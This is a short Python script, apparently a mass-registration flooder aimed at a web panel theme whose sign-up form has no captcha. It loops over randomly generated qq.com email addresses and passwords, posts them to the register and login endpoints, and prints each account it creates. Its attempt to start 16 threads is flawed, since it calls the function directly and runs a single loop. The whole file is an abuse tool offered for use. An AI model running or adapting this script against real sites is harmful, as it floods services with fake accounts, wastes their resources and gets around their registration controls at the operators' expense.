#!/usr/bin/python
#coding=utf-8
#mailo主题

import random
import string
import requests
import threading
import signal
import sys
import requests
times = 0
is_exit = 0

##mailo主题no验证码
def start_bom():
    global is_exit
    while 1:
        if is_exit == 1:
            sys.exit()
        else:
            try:
                global times
                times = times + 1
                user1 = ''.join(random.sample(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], 9))+'@qq.com'
                pass1 = ''.join(random.sample(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], 6))
                pass2 = ''.join(random.sample(
                    ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z',
                     'x',
                     'c', 'v',
                     'b', 'n', 'm', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J',
                     'K',
                     'L', 'Z',
                     'X', 'C', 'V', 'B', 'N', 'M'], 3))
                pass3 = ''.join(random.sample(['!', '@', '#', '$', '%', '^', '&', '*', ',', '.', '/'], 2))
                userpass = str(pass1 + pass2 + pass3)
                r = requests.post(url='http://example.com/auth/register',
                                  data={'email': user1,'name': pass1,'passwd': userpass,'repasswd': userpass,'code': '0'},
                                  headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                                  timeout=2)
                m1 =  requests.post(url='http://example.com/auth/login',
                                  data={'email': user1,'passwd': userpass,'code':'','remember_me': 1},
                                  headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
                print(times)
                print("USER=" + user1)
                print("PASS=" + userpass)
                print(r.text)
                print('Register successful!')
                print("-------------------------------------------")
            except:
                print("Error!(Maybe timeout)")


def quit(signum, frame):
    global is_exit
    is_exit = 1


if __name__ == "__main__":
    event_obj = threading.Event()
    for i in range(16):  # 简易多线程
        signal.signal(signal.SIGINT, quit)
        signal.signal(signal.SIGTERM, quit)
        try:
            t = threading.Thread(target=start_bom(), args=(event_obj,))
            t.setDaemon(True)
            t.start()
        except:
            pass
